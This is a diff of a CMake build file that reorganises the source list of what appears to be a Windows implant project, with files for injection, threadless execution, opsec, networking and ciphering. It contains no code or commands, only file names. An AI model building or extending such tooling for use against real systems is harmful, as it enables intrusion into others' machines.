@@ -10,8 +10,8 @@ set(META "/usr/share/mingw-w64/include")
 include_directories(include ${SOURCE} ${META})
 
 set(INCLUDE_FILES
-        core/include/monolith.hpp
-        core/include/ntimports.hpp
+        monolith.hpp
+        ntimports.hpp
         core/include/memory.hpp
         core/include/process.hpp
         core/include/cruntime.hpp
@@ -22,7 +22,10 @@ set(INCLUDE_FILES
         core/include/message.hpp
         core/include/stream.hpp
         core/include/parser.hpp
-        inject/inject.hpp
+        inject/injectlib.hpp
+        core/include/config.hpp
+        core/include/implant.hpp
+        core/include/corelib.hpp
 )
 set(MAIN_FILES
         mods/src/EnumDotNetProcesses.cpp
@@ -35,17 +38,18 @@ set(MAIN_FILES
         core/src/network.cpp
         core/src/utils.cpp
         core/src/opsec.cpp
-        core/src/core.cpp
+        core/src/implant.cpp
         core/src/message.cpp
-        core/include/context.hpp
-        core/src/context.cpp
         core/src/parser.cpp
         core/src/cipher.cpp
         core/src/stream.cpp
         core/src/commands.cpp
         loader/mainexe.cpp
         loader/dllmain.cpp
-        inject/inject.cpp
+        inject/injectlib.cpp
         inject/threadless/OpenFileExecute.cpp
+        core/src/config.cpp
+        inject/config.cpp
+        inject/config.hpp
 )
 add_executable(useful_modules ${INCLUDE_FILES} ${MAIN_FILES})
